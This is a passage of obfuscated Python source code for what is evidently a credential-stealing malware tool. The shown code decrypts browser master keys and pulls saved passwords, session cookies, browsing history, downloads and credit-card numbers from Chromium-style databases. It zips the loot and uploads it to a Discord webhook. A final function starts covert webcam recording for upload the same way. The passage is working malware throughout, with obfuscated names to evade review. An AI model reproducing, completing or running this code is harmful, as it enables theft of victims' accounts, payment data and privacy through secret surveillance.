            HANRWEFWEHBPVWGBWEBSKXGXRMNSABDIMPXJXHDTJOBBEEFQQUDSGPAEJBUCZWYKDEBDGJWDHVMAGSOTDDBZJUK = win32crypt.CryptUnprotectData(NNDUWJGFBTIPHYVWNZTCAQBSUYKZSNWYQMARGJRNTSMBMFHPGMEOCTQJXH_key, None, None, None, 0)[1]
            return HANRWEFWEHBPVWGBWEBSKXGXRMNSABDIMPXJXHDTJOBBEEFQQUDSGPAEJBUCZWYKDEBDGJWDHVMAGSOTDDBZJUK
        except:
            return None

    def decrypt_password(VRDGNGAYMJDVWENAOJFXFGHTBWDOLXSOUZWDEKOONRNJXBZSAHH, HANRWEFWEHBPVWGBWEBSKXGXRMNSABDIMPXJXHDTJOBBEEFQQUDSGPAEJBUCZWYKDEBDGJWDHVMAGSOTDDBZJUK):
        try:
            v4r_iv = VRDGNGAYMJDVWENAOJFXFGHTBWDOLXSOUZWDEKOONRNJXBZSAHH[3:15]
            v4r_payload = VRDGNGAYMJDVWENAOJFXFGHTBWDOLXSOUZWDEKOONRNJXBZSAHH[15:-16]
            v4r_tag = VRDGNGAYMJDVWENAOJFXFGHTBWDOLXSOUZWDEKOONRNJXBZSAHH[-16:]
            v4r_cipher = Cipher(algorithms.AES(HANRWEFWEHBPVWGBWEBSKXGXRMNSABDIMPXJXHDTJOBBEEFQQUDSGPAEJBUCZWYKDEBDGJWDHVMAGSOTDDBZJUK), modes.GCM(v4r_iv, v4r_tag))
            v4r_decryptor = v4r_cipher.decryptor()
            v4r_decrypted_pass = v4r_decryptor.update(v4r_payload) + v4r_decryptor.finalize()
            return v4r_decrypted_pass.decode()
        except:
            return None

    def list_tables(LHZNSODHHIIDCNSMLMCRJDKWZVHLTHOUBOYKZTFWNMEJHRWYKAWGJQFIYUIDVSIIKMOCXCMK):
        try:
            v4r_conn = sqlite3.connect(LHZNSODHHIIDCNSMLMCRJDKWZVHLTHOUBOYKZTFWNMEJHRWYKAWGJQFIYUIDVSIIKMOCXCMK)
            v4r_cursor = v4r_conn.cursor()
            v4r_cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            v4r_tables = v4r_cursor.fetchall()
            v4r_conn.close()
            return v4r_tables
        except:
            return []

    def get_passwords(DTXVLEURVZDQDNPEUFHORUBWLMOBRVLAYPZZLFTDCNALGILVMKGNZRZTQEXBTDTBPNIFCWEXMJYCNPNGRAIMMAMVYMUDCUOTT, MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG, YRTQTZVAFDNLIWHJFMLYBCJSTKTNIGCIYDVTBJJQFQSPRHYFUYONUCQZMEKUFFHEEEFTQNYHSUKYDMOZFXTNUUPPOWBEEU, HANRWEFWEHBPVWGBWEBSKXGXRMNSABDIMPXJXHDTJOBBEEFQQUDSGPAEJBUCZWYKDEBDGJWDHVMAGSOTDDBZJUK):
        v4r_password_db = os.path.join(YRTQTZVAFDNLIWHJFMLYBCJSTKTNIGCIYDVTBJJQFQSPRHYFUYONUCQZMEKUFFHEEEFTQNYHSUKYDMOZFXTNUUPPOWBEEU, 'Login Data')
        if not os.path.exists(v4r_password_db):
            return

        shutil.copy(v4r_password_db, 'password_db')
        v4r_tables = list_tables('password_db')

        v4r_conn = sqlite3.connect('password_db')
        v4r_cursor = v4r_conn.cursor()

        try:
            v4r_cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            BBDJWDUSDBDBCCYRZQGAKASMTYBNPRQDAJVBVKHNYYOAKXKSCBCPSCBEWLZZXVSBIPRIAIHLYTLBTSCCCWGIDOTIHBBVXEFLI.append(f"\n------------------------------| {DTXVLEURVZDQDNPEUFHORUBWLMOBRVLAYPZZLFTDCNALGILVMKGNZRZTQEXBTDTBPNIFCWEXMJYCNPNGRAIMMAMVYMUDCUOTT} ({MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG}) |------------------------------\n")
            for v4r_row in v4r_cursor.fetchall():
                if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                    continue
                v4r_url =      f"- Url      : {v4r_row[0]}"
                v4r_username = f"  Username : {v4r_row[1]}"
                v4r_password = f"  Password : {decrypt_password(v4r_row[2], HANRWEFWEHBPVWGBWEBSKXGXRMNSABDIMPXJXHDTJOBBEEFQQUDSGPAEJBUCZWYKDEBDGJWDHVMAGSOTDDBZJUK)}"
                BBDJWDUSDBDBCCYRZQGAKASMTYBNPRQDAJVBVKHNYYOAKXKSCBCPSCBEWLZZXVSBIPRIAIHLYTLBTSCCCWGIDOTIHBBVXEFLI.append(f"{v4r_url}\n{v4r_username}\n{v4r_password}\n")
        except:
            pass
        finally:
            v4r_conn.close()
            os.remove('password_db')

    def get_cookies(DTXVLEURVZDQDNPEUFHORUBWLMOBRVLAYPZZLFTDCNALGILVMKGNZRZTQEXBTDTBPNIFCWEXMJYCNPNGRAIMMAMVYMUDCUOTT, MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG, YRTQTZVAFDNLIWHJFMLYBCJSTKTNIGCIYDVTBJJQFQSPRHYFUYONUCQZMEKUFFHEEEFTQNYHSUKYDMOZFXTNUUPPOWBEEU, HANRWEFWEHBPVWGBWEBSKXGXRMNSABDIMPXJXHDTJOBBEEFQQUDSGPAEJBUCZWYKDEBDGJWDHVMAGSOTDDBZJUK):
        v4r_cookie_db = os.path.join(YRTQTZVAFDNLIWHJFMLYBCJSTKTNIGCIYDVTBJJQFQSPRHYFUYONUCQZMEKUFFHEEEFTQNYHSUKYDMOZFXTNUUPPOWBEEU, 'Network', 'Cookies')
        if not os.path.exists(v4r_cookie_db):
            return

        v4r_conn = None 
        try:
            shutil.copy(v4r_cookie_db, 'cookie_db')
            v4r_conn = sqlite3.connect('cookie_db')
            v4r_cursor = v4r_conn.cursor()
            v4r_cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
            LEWKXWAOSMMXFSEYSEUIUICQKEYCKFHVOIFFWQUDOKRAXTFCOTMODBBZHGFLJAXFXKVKQERE.append(f"\n------------------------------| {DTXVLEURVZDQDNPEUFHORUBWLMOBRVLAYPZZLFTDCNALGILVMKGNZRZTQEXBTDTBPNIFCWEXMJYCNPNGRAIMMAMVYMUDCUOTT} ({MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG}) |------------------------------\n")
            for v4r_row in v4r_cursor.fetchall():
                if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                    continue
                v4r_url =    f"- Url    : {v4r_row[0]}"
                v4r_name =   f"  Name   : {v4r_row[1]}"
                MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG =   f"  Path   : {v4r_row[2]}"
                v4r_cookie = f"  Cookie : {decrypt_password(v4r_row[3], HANRWEFWEHBPVWGBWEBSKXGXRMNSABDIMPXJXHDTJOBBEEFQQUDSGPAEJBUCZWYKDEBDGJWDHVMAGSOTDDBZJUK)}"
                v4r_expire = f"  Expire : {v4r_row[4]}"
                LEWKXWAOSMMXFSEYSEUIUICQKEYCKFHVOIFFWQUDOKRAXTFCOTMODBBZHGFLJAXFXKVKQERE.append(f"{v4r_url}\n{v4r_name}\n{MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG}\n{v4r_cookie}\n{v4r_expire}\n")
        except:
            pass
        finally:
            if v4r_conn:
                v4r_conn.close()
            try:
                os.remove('cookie_db')
            except:
                pass


    def get_history(DTXVLEURVZDQDNPEUFHORUBWLMOBRVLAYPZZLFTDCNALGILVMKGNZRZTQEXBTDTBPNIFCWEXMJYCNPNGRAIMMAMVYMUDCUOTT, MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG, YRTQTZVAFDNLIWHJFMLYBCJSTKTNIGCIYDVTBJJQFQSPRHYFUYONUCQZMEKUFFHEEEFTQNYHSUKYDMOZFXTNUUPPOWBEEU):
        v4r_history_db = os.path.join(YRTQTZVAFDNLIWHJFMLYBCJSTKTNIGCIYDVTBJJQFQSPRHYFUYONUCQZMEKUFFHEEEFTQNYHSUKYDMOZFXTNUUPPOWBEEU, 'History')
        if not os.path.exists(v4r_history_db):
            return

        shutil.copy(v4r_history_db, 'history_db')
        v4r_conn = sqlite3.connect('history_db')
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT url, title, last_visit_time FROM urls')
        UQEOXZWHXDJVNZALEFRDJLEKWLRSTCPHRPJTGOBSUELWFBCNMDDZDFMCGFIYDQMZONED.append(f"\n------------------------------| {DTXVLEURVZDQDNPEUFHORUBWLMOBRVLAYPZZLFTDCNALGILVMKGNZRZTQEXBTDTBPNIFCWEXMJYCNPNGRAIMMAMVYMUDCUOTT} ({MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG}) |------------------------------\n")
        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            v4r_url =   f"- Url   : {v4r_row[0]}"
            v4r_title = f"  Title : {v4r_row[1]}"
            v4r_time =  f"  Time  : {v4r_row[2]}"
            UQEOXZWHXDJVNZALEFRDJLEKWLRSTCPHRPJTGOBSUELWFBCNMDDZDFMCGFIYDQMZONED.append(f"{v4r_url}\n{v4r_title}\n{v4r_time}\n")

        v4r_conn.close()
        os.remove('history_db')

    def get_downloads(DTXVLEURVZDQDNPEUFHORUBWLMOBRVLAYPZZLFTDCNALGILVMKGNZRZTQEXBTDTBPNIFCWEXMJYCNPNGRAIMMAMVYMUDCUOTT, MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG, YRTQTZVAFDNLIWHJFMLYBCJSTKTNIGCIYDVTBJJQFQSPRHYFUYONUCQZMEKUFFHEEEFTQNYHSUKYDMOZFXTNUUPPOWBEEU):
        v4r_downloads_db = os.path.join(YRTQTZVAFDNLIWHJFMLYBCJSTKTNIGCIYDVTBJJQFQSPRHYFUYONUCQZMEKUFFHEEEFTQNYHSUKYDMOZFXTNUUPPOWBEEU, 'History')
        if not os.path.exists(v4r_downloads_db):
            return

        shutil.copy(v4r_downloads_db, 'downloads_db')
        v4r_conn = sqlite3.connect('downloads_db')
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT tab_url, target_path FROM downloads')
        RJRDAAXANIONPLTVARAWGXVQAZNXDAPOWJJAABGIABOEGZKPHWREXGWEQPEVHZRWVPKQBOTZDQWLPNHCEKCHJDYUXEGYZMEXB.append(f"\n------------------------------| {DTXVLEURVZDQDNPEUFHORUBWLMOBRVLAYPZZLFTDCNALGILVMKGNZRZTQEXBTDTBPNIFCWEXMJYCNPNGRAIMMAMVYMUDCUOTT} ({MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG}) |------------------------------\n")
        for row in v4r_cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG = f"- Path : {row[1]}"
            v4r_url =  f"  Url  : {row[0]}"
            RJRDAAXANIONPLTVARAWGXVQAZNXDAPOWJJAABGIABOEGZKPHWREXGWEQPEVHZRWVPKQBOTZDQWLPNHCEKCHJDYUXEGYZMEXB.append(f"{MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG}\n{v4r_url}\n")

        v4r_conn.close()
        os.remove('downloads_db')

    def get_cards(DTXVLEURVZDQDNPEUFHORUBWLMOBRVLAYPZZLFTDCNALGILVMKGNZRZTQEXBTDTBPNIFCWEXMJYCNPNGRAIMMAMVYMUDCUOTT, MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG, YRTQTZVAFDNLIWHJFMLYBCJSTKTNIGCIYDVTBJJQFQSPRHYFUYONUCQZMEKUFFHEEEFTQNYHSUKYDMOZFXTNUUPPOWBEEU, HANRWEFWEHBPVWGBWEBSKXGXRMNSABDIMPXJXHDTJOBBEEFQQUDSGPAEJBUCZWYKDEBDGJWDHVMAGSOTDDBZJUK):
        v4r_cards_db = os.path.join(YRTQTZVAFDNLIWHJFMLYBCJSTKTNIGCIYDVTBJJQFQSPRHYFUYONUCQZMEKUFFHEEEFTQNYHSUKYDMOZFXTNUUPPOWBEEU, 'Web Data')
        if not os.path.exists(v4r_cards_db):
            return

        shutil.copy(v4r_cards_db, 'cards_db')
        v4r_conn = sqlite3.connect('cards_db')
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        XFTYYZBGCMNSHTYZOSQUJIIYMNXTRSHTTYPNPNPOTHQDJWCEDOELUXKQSKLEQC.append(f"\n------------------------------| {DTXVLEURVZDQDNPEUFHORUBWLMOBRVLAYPZZLFTDCNALGILVMKGNZRZTQEXBTDTBPNIFCWEXMJYCNPNGRAIMMAMVYMUDCUOTT} ({MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG}) |------------------------------\n")
        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            v4r_name =             f"- Name             : {v4r_row[0]}"
            v4r_expiration_month = f"  Expiration Month : {v4r_row[1]}"
            v4r_expiration_year =  f"  Expiration Year  : {v4r_row[2]}"
            v4r_card_number =      f"  Card Number      : {decrypt_password(v4r_row[3], HANRWEFWEHBPVWGBWEBSKXGXRMNSABDIMPXJXHDTJOBBEEFQQUDSGPAEJBUCZWYKDEBDGJWDHVMAGSOTDDBZJUK)}"
            v4r_date_modified =    f"  Date Modified    : {v4r_row[4]}"
            XFTYYZBGCMNSHTYZOSQUJIIYMNXTRSHTTYPNPNPOTHQDJWCEDOELUXKQSKLEQC.append(f"{v4r_name}\n{v4r_expiration_month}\n{v4r_expiration_year}\n{v4r_card_number}\n{v4r_date_modified}\n")

        v4r_conn.close()
        os.remove('cards_db')

    def write_files(KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ):
        os.makedirs(f"Browser_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}", exist_ok=True)

        if BBDJWDUSDBDBCCYRZQGAKASMTYBNPRQDAJVBVKHNYYOAKXKSCBCPSCBEWLZZXVSBIPRIAIHLYTLBTSCCCWGIDOTIHBBVXEFLI:
            with open(f"Browser_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}\\Passwords_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(BBDJWDUSDBDBCCYRZQGAKASMTYBNPRQDAJVBVKHNYYOAKXKSCBCPSCBEWLZZXVSBIPRIAIHLYTLBTSCCCWGIDOTIHBBVXEFLI))

        if LEWKXWAOSMMXFSEYSEUIUICQKEYCKFHVOIFFWQUDOKRAXTFCOTMODBBZHGFLJAXFXKVKQERE:
            with open(f"Browser_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}\\Cookies_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(LEWKXWAOSMMXFSEYSEUIUICQKEYCKFHVOIFFWQUDOKRAXTFCOTMODBBZHGFLJAXFXKVKQERE))

        if UQEOXZWHXDJVNZALEFRDJLEKWLRSTCPHRPJTGOBSUELWFBCNMDDZDFMCGFIYDQMZONED:
            with open(f"Browser_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}\\History_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(UQEOXZWHXDJVNZALEFRDJLEKWLRSTCPHRPJTGOBSUELWFBCNMDDZDFMCGFIYDQMZONED))

        if RJRDAAXANIONPLTVARAWGXVQAZNXDAPOWJJAABGIABOEGZKPHWREXGWEQPEVHZRWVPKQBOTZDQWLPNHCEKCHJDYUXEGYZMEXB:
            with open(f"Browser_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}\\Downloads_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(RJRDAAXANIONPLTVARAWGXVQAZNXDAPOWJJAABGIABOEGZKPHWREXGWEQPEVHZRWVPKQBOTZDQWLPNHCEKCHJDYUXEGYZMEXB))

        if XFTYYZBGCMNSHTYZOSQUJIIYMNXTRSHTTYPNPNPOTHQDJWCEDOELUXKQSKLEQC:
            with open(f"Browser_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}\\Cards_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(XFTYYZBGCMNSHTYZOSQUJIIYMNXTRSHTTYPNPNPOTHQDJWCEDOELUXKQSKLEQC))

        with ZipFile(f"Browser_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}.zip", "w") as zipf:
            for v4r_file in os.listdir(f"Browser_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}"):
                zipf.write(os.path.join(f"Browser_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}", v4r_file), v4r_file)

    def send_files(KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ, CDJGKMNDPYCRWAIORTRRUVKSMSQEGVKXHTOFOIFWBAUVQNJWVOMAWJ):
        CDJGKMNDPYCRWAIORTRRUVKSMSQEGVKXHTOFOIFWBAUVQNJWVOMAWJ.send(
            embed=Embed(
                title=f'Browser Steal  `{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ} "{ENCFWDCTDTNOBRFRJTPNHGLQXUVKHAPPFPPBZHGRMCUHXBJLFUVHBIWIONMWHHVQPSCTBWZPQOGFBCZKHNSDUIYQXBV}"`:',
                description=f"Found In **{'**, **'.join(KQCTPCKTZTCUXZCPWTHRINXFNWILMAABBGRUEWUPDQCLIJDXIFXKJXLMWGUJZBEBAJKIXMGTOATYYM)}**:```" + '\n'.join(tree(Path(f"Browser_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}"))) + "```",
                color=ZJQSCZNFABWTTCTHNEROXLYDNUXYWZWEYFMQSUYYYZUXZQEKCUEBU,
            ).set_footer(
                text=EQKWKSYZNWWEERHCPRYDHPDLHLJXVJVEKMQWBMSQAIQVUSUOJEQQBQRCNYBYDEEMEAOMEFOWMCWPXXUXE,
                icon_url=EYWGOEBDUKMJUOZRVNILEDDRUTOSHGOTSKSRNIOYDGTRCMHVSOPFEIJFFSLNPAFZCQFJAIPFLQGHYWP
            ),
            file=File(fp=f"Browser_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}.zip", filename=f"Browser_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}.zip"), username=PLQGNCIXLRJNBHSLTCFMOMZZUFODSVVFETFDRKHLJUXJVKLHOER, avatar_url=EYWGOEBDUKMJUOZRVNILEDDRUTOSHGOTSKSRNIOYDGTRCMHVSOPFEIJFFSLNPAFZCQFJAIPFLQGHYWP
        )

    def clean_files(KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ):
        shutil.rmtree(f"Browser_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}")
        os.remove(f"Browser_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}.zip")

    def tree(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG: Path, v4r_prefix: str = '', v4r_midfix_folder: str = '📂 - ', v4r_midfix_file: str = '📄 - '):
        v4r_pipes = {
            'space':  '    ',
            'branch': '│   ',
            'tee':    '├── ',
            'last':   '└── ',
        }

        if v4r_prefix == '':
            yield v4r_midfix_folder + MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG.name

        contents = list(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG.iterdir())
        pointers = [v4r_pipes['tee']] * (len(contents) - 1) + [v4r_pipes['last']]
        for v4r_pointer, MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG in zip(pointers, contents):
            if MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG.is_dir():
                yield f"{v4r_prefix}{v4r_pointer}{v4r_midfix_folder}{MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG.name} ({len(list(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG.glob('**/*')))} files, {sum(f.stat().st_size for f in MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
                v4r_extension = v4r_pipes['branch'] if v4r_pointer == v4r_pipes['tee'] else v4r_pipes['space']
                yield from tree(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG, prefix=v4r_prefix+v4r_extension)
            else:
                yield f"{v4r_prefix}{v4r_pointer}{v4r_midfix_file}{MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG.name} ({MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG.stat().st_size / 1024:.2f} kb)"
    Br0ws53r_Main()

def C4m3r4_C4ptur3():
    import os
    import cv2
    from discord import SyncWebhook, Embed, File
    from datetime import datetime

    try:
        from datetime import datetime
        ZRKYAFTIWRHLPRJPWXAIMNQDOBAHXDTFLWOWISJXYZCIMZEKVVUPLWWXCDTZERWYYESF = f"CameraCapture_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}.avi"
        XPMSHEIDVMLTSADPLVDEVYLBHHUESLNGJHNXYDEYPYMHBYDHMRTDJEAT = 10
        GQMOIWRDBCDTDPZIOSRVLSNDPSDODJDVTIPDFBTLSTSFKVNHBFPOGRKJEHELNIQAMVAEUFFWGZMGYYEQYCWBMWRSFOBAWMG = cv2.VideoCapture(0)

        if not GQMOIWRDBCDTDPZIOSRVLSNDPSDODJDVTIPDFBTLSTSFKVNHBFPOGRKJEHELNIQAMVAEUFFWGZMGYYEQYCWBMWRSFOBAWMG.isOpened():
            Clear()
            CDJGKMNDPYCRWAIORTRRUVKSMSQEGVKXHTOFOIFWBAUVQNJWVOMAWJ = SyncWebhook.from_url(VNUQGLLFFWQKTFMBPEWBBQEXUGTDSOPPDHYZGTEXOKPHLLJCMKXKXUZCWMCZQLJLWXHJGKPXGSYMMTSKEFOIZM)
            NPAMMYCSIUWMJAUXZXCRWEPPVQPRJXIQOHWVDUOHSKMUHMSYAVSKFRWJJKJWVJNFAHMAJQC = Embed(
                title=f'Camera Capture `{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ} "{ENCFWDCTDTNOBRFRJTPNHGLQXUVKHAPPFPPBZHGRMCUHXBJLFUVHBIWIONMWHHVQPSCTBWZPQOGFBCZKHNSDUIYQXBV}"`:', 
                description=f"No camera found.",
                color=ZJQSCZNFABWTTCTHNEROXLYDNUXYWZWEYFMQSUYYYZUXZQEKCUEBU)
            NPAMMYCSIUWMJAUXZXCRWEPPVQPRJXIQOHWVDUOHSKMUHMSYAVSKFRWJJKJWVJNFAHMAJQC.set_footer(text=EQKWKSYZNWWEERHCPRYDHPDLHLJXVJVEKMQWBMSQAIQVUSUOJEQQBQRCNYBYDEEMEAOMEFOWMCWPXXUXE, icon_url=EYWGOEBDUKMJUOZRVNILEDDRUTOSHGOTSKSRNIOYDGTRCMHVSOPFEIJFFSLNPAFZCQFJAIPFLQGHYWP)
            CDJGKMNDPYCRWAIORTRRUVKSMSQEGVKXHTOFOIFWBAUVQNJWVOMAWJ.send(embed=NPAMMYCSIUWMJAUXZXCRWEPPVQPRJXIQOHWVDUOHSKMUHMSYAVSKFRWJJKJWVJNFAHMAJQC, username=PLQGNCIXLRJNBHSLTCFMOMZZUFODSVVFETFDRKHLJUXJVKLHOER, avatar_url=EYWGOEBDUKMJUOZRVNILEDDRUTOSHGOTSKSRNIOYDGTRCMHVSOPFEIJFFSLNPAFZCQFJAIPFLQGHYWP)
            return

        def c4ptur3(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG_file_capture):
            v4r_fourcc = cv2.VideoWriter_fourcc(*'XVID')
            v4r_out = cv2.VideoWriter(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG_file_capture, v4r_fourcc, 20.0, (640, 480))
            v4r_time_start = datetime.now()
            Clear()
            while (datetime.now() - v4r_time_start).seconds < XPMSHEIDVMLTSADPLVDEVYLBHHUESLNGJHNXYDEYPYMHBYDHMRTDJEAT:
                Clear()
                v4r_ret, v4r_frame = GQMOIWRDBCDTDPZIOSRVLSNDPSDODJDVTIPDFBTLSTSFKVNHBFPOGRKJEHELNIQAMVAEUFFWGZMGYYEQYCWBMWRSFOBAWMG.read()
                if not v4r_ret:
                    Clear()
                    break
                v4r_out.write(v4r_frame)

